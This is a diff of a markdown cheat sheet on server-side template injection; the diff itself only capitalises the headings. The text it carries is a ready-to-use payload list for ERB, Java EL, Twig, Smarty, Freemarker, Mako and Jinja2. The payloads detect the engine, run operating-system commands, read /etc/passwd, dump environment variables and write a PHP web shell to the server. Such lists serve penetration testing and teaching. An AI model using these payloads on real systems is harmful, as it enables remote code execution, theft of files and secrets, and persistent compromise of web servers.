@@ -1,4 +1,4 @@
-### identify using strings
+### Identify using strings
 ```
 {{7*7}}
 ${7*7}
@@ -7,7 +7,7 @@ ${{7*7}}
 <%= 7 * 7 %>
 ```
 
-### decision tree (> means no error)
+### Decision tree (> means no error)
 ```
 ${7*7}
 │
@@ -35,12 +35,12 @@ ${7*7}
 ```
 
 
-### ruby ERB engine - read files and directories
+### Ruby ERB engine - read files and directories
 ```
 <%= Dir.entries('/') %>
 ```
 
-### ruby ERB engine - os command
+### Ruby ERB engine - os command
 ```
 <%= system('<command>') %>
 <%= `<command> /` %>
@@ -50,44 +50,44 @@ ${7*7}
 ```
 
 
-### java - retrieve environment variables
+### Java - retrieve environment variables
 ```
 ${T(java.lang.System).getenv()}
 ```
 
-### java - os command
+### Java - os command
 ```
 ${T(java.lang.Runtime).getRuntime().exec('<command>')}
 ```
 
 
-### expression language EL - os command
+### Expression language EL - os command
 ```
 ''.class.forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec(<command>)
 ''.class.forName('java.lang.ProcessBuilder').getDeclaredConstructors()[1].newInstance(<command>).start()
 ```
 
 
-### twig - file read 
+### Twig - file read 
 ```
 "{{'/etc/passwd'|file_excerpt(1,30)}}"@
 ```
 
-### twig - os command (use \x20 or $IFS for blank)
+### Twig - os command (use \x20 or $IFS for blank)
 ```
 {{['<command>']|filter('system')}}
 {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("<command>")}}
 ```
 
 
-### smarty - os command
+### Smarty - os command
 ```
 {php}echo `<command>`;{/php}
 {Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['<command>']); ?>",self::clearConfig())}
 ```
 
 
-### freemarker - os command
+### Freemarker - os command
 ```
 <#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("<command>")}
 [#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('<command>')}
@@ -95,7 +95,7 @@ ${"freemarker.template.utility.Execute"?new()("<command>")}
 ```
 
 
-### mako - os command
+### Mako - os command
 ```
 <%
 import os
@@ -105,13 +105,13 @@ ${x}
 ```
 
 
-### jinja2 - os command (number 396 will vary depending of the application)
+### Jinja2 - os command (number 396 will vary depending of the application)
 ```
 {{''.__class__.mro()[1].__subclasses__()[396]('<command>',shell=True,stdout=-1).communicate()[0].strip()}}
 {{config.__class__.__init__.__globals__['os'].popen('<command>').read()}}
 ```
 
 
-### find more
+### Find more
 https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection  
 
